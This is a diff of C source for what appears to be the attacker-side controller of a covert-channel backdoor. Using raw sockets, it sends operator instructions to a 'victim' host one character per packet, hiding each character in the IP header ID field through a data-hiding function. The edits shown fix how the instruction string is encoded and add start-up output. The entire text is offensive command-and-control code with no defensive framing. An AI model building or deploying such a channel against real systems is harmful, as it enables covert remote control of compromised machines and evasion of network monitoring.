@@ -7,7 +7,6 @@ int main(void) {
     char errbuf[PCAP_ERRBUF_SIZE] = {0};
     char buffer[RECEIVE_SIZE] = {0};
     char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0}, t_buffer[SEND_SIZE] = {0};
-    char* packet;
     char* nic_interface;
     bpf_u_int32 netp;
     bpf_u_int32 maskp;
@@ -33,8 +32,9 @@ int main(void) {
     get_gateway_ip(&opts);
     nic_interface = pcap_lookupdev(errbuf);
     get_my_ip(nic_interface, &opts);
-
     create_attacker_socket(&opts, &victim_address);
+    puts("============ Initialize program ============");
+    fflush(stdout);
 
     timeout.tv_sec = 1;
     timeout.tv_usec = 0;
@@ -52,8 +52,8 @@ int main(void) {
         if (fd_num == -1) {
             perror("Select() failed");
             exit(EXIT_FAILURE);
-        } else if (fd_num == 0) continue; // time out
-
+        }
+        else if (fd_num == 0) continue; // time out
         for (int i = 0; i < fd_max + 1; i++) {
             if (FD_ISSET(i, &cpy_reads)) {
                 if (i == opts.attacker_socket) {
@@ -73,10 +73,10 @@ int main(void) {
                         }
 
                         // TODO: Create RAW PACKET
-                        sprintf(instruction, "[[[ %s ]]]", opts.victim_instruction);
+                        sprintf(instruction, "[[%s]]", opts.victim_instruction);
                         for (int j = 0; j < strlen(instruction); j++) {
                             create_udp_header(&uh);
-                            create_ip_header(&ih, opts.victim_instruction[j], &opts);
+                            create_ip_header(&ih, instruction[j], &opts);
                             memcpy(s_buffer, &ih, sizeof(struct iphdr));
                             memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
                             byte = sendto(opts.attacker_socket, (const char*)s_buffer, SEND_SIZE, 0, (const struct sockaddr*)&victim_address, sizeof(victim_address));
@@ -210,7 +210,7 @@ unsigned short create_ip_header(struct iphdr* ih, char c, struct options_attacke
     ih->ihl = 5;
     ih->version = 4;
     ih->tos = 0;
-    ih->id = htons(encrypt_decrypt(c));
+    ih->id = htons(hide_data((uint16_t)c));
     ih->tot_len = htons(28);
     ih->ttl = 64;
     ih->frag_off = 0;
